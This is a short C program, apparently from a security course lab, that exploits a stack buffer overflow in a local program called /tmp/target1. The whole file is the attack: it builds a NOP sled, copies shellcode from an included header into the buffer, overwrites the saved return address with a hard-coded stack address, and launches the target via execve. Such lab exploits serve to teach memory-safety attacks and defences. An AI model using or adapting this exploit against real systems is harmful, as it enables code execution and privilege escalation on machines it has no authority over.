#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define BUFFER_SIZE 248
#define NOP 0x90

int main(void)
{
  char *args[3];
  char *env[1];
  int bsize = BUFFER_SIZE;
  char buff[bsize];
  int i,j;


 //Fill buffer with NOPS
  for (i= 0; i < bsize; i++)
    buff[i] = NOP;
  
 //Copying the shellcode into the buffer
 for (j = 0,i = bsize/2; j < strlen(shellcode);j++,i++) {
   buff[i] = shellcode[j];
 }
  //Put the shellcode address in the end of the buffer
   long *tmp = (long *)(buff + 244);
   *tmp = 0xbffffc88;
  
  

  

  args[0] = TARGET;
  args[1] = buff;
  //args[1] = "I am here";
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
